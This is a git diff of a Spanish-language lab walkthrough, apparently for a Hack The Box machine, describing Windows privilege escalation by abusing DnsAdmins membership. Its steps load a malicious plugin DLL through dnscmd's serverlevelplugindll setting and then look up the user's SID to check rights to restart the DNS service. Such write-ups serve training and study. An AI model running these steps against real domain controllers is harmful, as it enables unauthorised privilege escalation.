@@ -399,7 +399,15 @@ xfreerdp /v:10.129.11.96 /u:netadm
 
 <img width="1534" height="988" alt="image" src="https://github.com/user-attachments/assets/fca709e9-6252-439a-a693-b48e07394953" />
 
-Abrimos una `powershell` y verificamos si pertenecemos al grupo `DnsAdmins`:
+Como era de esperar, no tenemos permisos de acceso al mismo.
+
+
+Abrimos una `powershell` e intentamos abrir el archivo especificado:
+<img width="963" height="235" alt="image" src="https://github.com/user-attachments/assets/b348dd18-e9f7-4435-a0e0-26d1cb99f960" />
+
+
+
+Verificamos si pertenecemos al grupo `DnsAdmins`:
 ```powershell
 Get-ADGroupMember -Identity DnsAdmins
 ```
@@ -439,3 +447,19 @@ dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 ```
 
 <img width="845" height="156" alt="image" src="https://github.com/user-attachments/assets/6006cc50-c984-4934-985d-05c34aecaf11" />
+
+
+Para que estos cambios tengan efecto, el servicio DNS debe reiniciarse. Procedemos a verificar si tenemos los permisos para reiniciar el servicio.
+
+Obtenemos nuestro `SID`:
+```powershell
+wmic useraccount where name="netadm" get sid
+```
+Este comando no funciona por lo que lo modificamos:
+```powershell
+wmic useraccount where "name='netadm'" get sid
+```
+
+<img width="693" height="70" alt="image" src="https://github.com/user-attachments/assets/fcbb9c52-c6af-4e93-9f08-07118acbc1fb" />
+
+Obtenemos nuestro `SID`: `S-1-5-21-669053619-2741956077-1013132368-1109`
